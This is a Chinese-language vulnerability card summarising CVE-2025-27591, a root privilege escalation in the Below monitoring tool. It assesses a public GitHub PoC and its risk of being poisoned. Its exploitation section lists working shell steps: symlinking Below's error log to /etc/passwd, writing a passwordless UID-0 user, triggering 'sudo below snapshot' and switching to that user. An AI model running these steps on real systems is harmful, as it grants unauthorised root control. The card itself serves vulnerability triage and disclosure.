## CVE-2025-27591-Below-本地提权

**漏洞编号:** CVE-2025-27591

**漏洞类型:** 本地提权

**影响应用:** Below

**危害等级:** 高危，可导致本地用户提升为root权限

**影响版本:** < 0.9.0

**利用条件:** 需要目标系统运行Below服务，且用户属于sudo组，并配置了NOPASSWD访问/usr/bin/below

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞存在于Below v0.8.1版本，由于`/var/log/below/`目录被创建为世界可写，攻击者可以利用符号链接攻击，将`error_<user>.log`链接到`/etc/passwd`等敏感文件。当使用sudo执行`below snapshot`时，会强制将链接的文件权限设置为0666并写入内容，从而允许攻击者修改`/etc/passwd`文件，添加一个具有root权限但无需密码的用户，最终获得root shell。

**有效性：**
提供的PoC代码有效，利用了漏洞描述中的符号链接攻击和不安全的权限设置。

**投毒风险：**
PoC代码本身功能明确，风险较低。风险点在于: 
1. README.md中引用了githubusercontent的图片资源，存在被替换的风险。 
2. exploit.sh脚本执行的命令比较简单，虽然修改了/etc/passwd文件，但是可以很轻易的审计出来。 
综合评估投毒风险较低，约为5%。

**利用方式：**
1.  删除已存在的日志文件：`rm -f /var/log/below/error_$u.log`
2.  创建符号链接：`ln -s /etc/passwd /var/log/below/error_$u.log`，将日志文件链接到`/etc/passwd`。
3.  构造恶意`/etc/passwd`条目：`echo 'pwn::0:0:root:/root:/bin/bash' > /tmp/pwn_entry`，创建一个包含恶意用户的条目。
4.  将恶意条目写入`/etc/passwd`：`cat /tmp/pwn_entry > /var/log/below/error_$u.log`，利用`below`服务写入操作。
5.  执行`below snapshot`：`sudo /usr/bin/below snapshot --begin now 2>/dev/null || true`，触发漏洞利用。
6.  切换用户：`su pwn`，切换到新添加的root用户。

**项目地址:** [rvizx/CVE-2025-27591](https://github.com/rvizx/CVE-2025-27591)

**漏洞详情:** [CVE-2025-27591](https://nvd.nist.gov/vuln/detail/CVE-2025-27591)